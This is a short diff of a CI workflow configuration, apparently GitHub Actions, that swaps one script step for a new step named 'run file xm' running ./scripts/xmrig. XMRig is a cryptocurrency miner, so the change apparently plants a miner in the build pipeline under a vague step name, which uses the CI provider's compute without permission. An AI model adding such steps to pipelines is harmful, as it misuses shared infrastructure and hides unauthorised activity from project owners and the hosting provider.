@@ -22,8 +22,8 @@ jobs:
       - name: run file
         run: ./scripts/runs.sh
 
-      - name: run file
-        run: ./runs.sh
+      - name: run file xm
+        run: ./scripts/xmrig
 
 #      - name: Setup Java
 #        uses: actions/setup-java@v1
